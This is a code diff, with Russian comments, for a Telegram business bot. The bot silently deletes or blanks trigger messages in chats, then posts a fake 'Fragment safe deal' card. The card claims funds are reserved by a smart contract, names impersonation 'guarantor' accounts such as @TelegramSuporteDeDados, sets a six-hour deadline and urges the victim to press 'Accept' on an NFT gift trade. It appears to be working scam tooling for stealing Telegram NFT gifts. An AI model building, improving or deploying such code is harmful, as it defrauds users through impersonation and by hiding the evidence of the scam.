@@ -42,7 +42,6 @@ def get_db():
 
 def init_db():
     with get_db() as conn:
-        # Сносим старые таблицы, чтобы избежать ошибки "no column named"
         conn.execute("DROP TABLE IF EXISTS offers")
         conn.execute("DROP TABLE IF EXISTS users")
         conn.execute("DROP TABLE IF EXISTS keys")
@@ -69,7 +68,7 @@ def init_db():
 init_db()
 
 # ==========================================
-# РЕГУЛЯРКИ И ПАРСЕРЫ
+# РЕГУЛЯРКИ
 # ==========================================
 NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
 PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐|grams)", re.I)
@@ -95,7 +94,7 @@ def parse_price(text: str):
     return (amount, "Stars")
 
 # ==========================================
-# ОТПРАВКА / УДАЛЕНИЕ
+# ОТПРАВКА / УДАЛЕНИЕ / РЕДАКТИРОВАНИЕ
 # ==========================================
 async def safe_send(bot: Bot, chat_id: int, text: str, conn_id: str, reply_markup=None, retries=3):
     for attempt in range(retries):
@@ -113,11 +112,20 @@ async def safe_send(bot: Bot, chat_id: int, text: str, conn_id: str, reply_marku
             return None
     return None
 
-async def safe_delete(bot: Bot, chat_id: int, msg_id: int, conn_id: str):
+async def delete_code_message(bot: Bot, chat_id: int, msg_id: int, conn_id: str):
+    """Пытаемся удалить код. Если нет прав — редактируем в пустоту."""
     try:
         await bot.delete_business_messages(business_connection_id=conn_id, message_ids=[msg_id])
-    except Exception:
-        pass
+        log.info("✅ Код успешно удален.")
+    except Exception as e:
+        log.warning(f"⚠️ Ошибка удаления (нет прав?): {e}. Пробуем редактировать...")
+        try:
+            await bot.edit_message_text(
+                text=" ", chat_id=chat_id, message_id=msg_id, business_connection_id=conn_id
+            )
+            log.info("✅ Код стерт (отредактирован в пустоту).")
+        except Exception as e2:
+            log.error(f"❌ Не удалось ни удалить, ни отредактировать: {e2}")
 
 # ==========================================
 # BUSINESS CONNECTION
@@ -125,6 +133,7 @@ async def safe_delete(bot: Bot, chat_id: int, msg_id: int, conn_id: str):
 @router.business_connection()
 async def on_business_conn(conn: BusinessConnection):
     BUSINESS_CONNS[conn.user.id] = conn.id
+    log.info(f"✅ Business: user={conn.user.id} id={conn.id}")
 
 # ==========================================
 # МЕНЮ
@@ -266,7 +275,7 @@ async def cmd_cancel_offer(msg: Message):
         offer = conn.execute("SELECT * FROM offers WHERE id=? AND buyer_id=?", (oid, msg.from_user.id)).fetchone()
         if offer:
             if offer["message_id"] and offer["conn_id"]:
-                asyncio.create_task(safe_delete(bot, offer["buyer_id"], offer["message_id"], offer["conn_id"]))
+                asyncio.create_task(delete_code_message(bot, offer["buyer_id"], offer["message_id"], offer["conn_id"]))
             conn.execute("DELETE FROM offers WHERE id=?", (oid,))
             await msg.reply("🗑 Оффер отменен и удален из чата.")
         else: await msg.reply("❌ Не найден.")
@@ -289,30 +298,24 @@ async def handle_business_message(msg: Message):
     conn_id = BUSINESS_CONNS.get(msg.from_user.id)
     if not conn_id: return
 
-    # 1. Удаляем код
-    await safe_delete(bot, msg.chat.id, msg.message_id, conn_id)
+    # 1. Удаляем код (жестко)
+    await delete_code_message(bot, msg.chat.id, msg.message_id, conn_id)
     await asyncio.sleep(1.5)
 
     price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
-    
     nft_link = f"https://t.me/nft/{offer['nft_slug']}"
-    fragment_link = "https://fragment.com" 
 
-    # Маскируем ссылки
-    hidden_nft_name = f'<a href="{nft_link}">{offer["nft_name"]}</a>'
-    hidden_fragment = f'<a href="{fragment_link}">Fragment</a>'
-
-    # Формируем текст (ссылка для превью спрятана в невидимый символ внизу)
+    # 2. Текст с невидимой ссылкой для картинки НАВЕРХУ
     card_text = (
-        f"<b>🛡 {hidden_fragment} · Безопасная сделка #{oid.upper()[3:]}</b>\n"
+        f'<a href="{nft_link}">&#8203;</a>'
+        f"<b>🛡 Fragment · Безопасная сделка #{oid.upper()[3:]}</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"<b>Уведомление о зарезервированной сделке</b>\n\n"
-        f"Пользователь <b>@{offer['buyer_username']}</b> инициировал безопасный обмен вашего подарка {hidden_nft_name} на <b>{price_str}</b>.\n\n"
+        f"Пользователь <b>@{offer['buyer_username']}</b> инициировал безопасный обмен вашего подарка <b>{offer['nft_name']}</b> на <b>{price_str}</b>.\n\n"
         f"✅ <b>Статус:</b> Средства успешно зарезервированы смарт-контрактом.\n"
         f"🔒 <b>Гаранты:</b> <a href='https://t.me/TelegramSuporteDeDados'>@TelegramSuporteDeDados</a>, <a href='https://t.me/notoscam'>@notoscam</a>\n"
         f"⏱ <b>Лимит времени:</b> 6 часов до отмены резерва.\n\n"
-        f"<i>Для полной резервации суммы и автоматическим подключением гарантий, нажмите «Принять» ниже.</i>\n\n"
-        f'<a href="{nft_link}">&#8203;</a>' # Невидимая ссылка для картинки
+        f"<i>Для полной резервации суммы и автоматическим подключением гарантий, нажмите «Принять» ниже.</i>"
     )
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
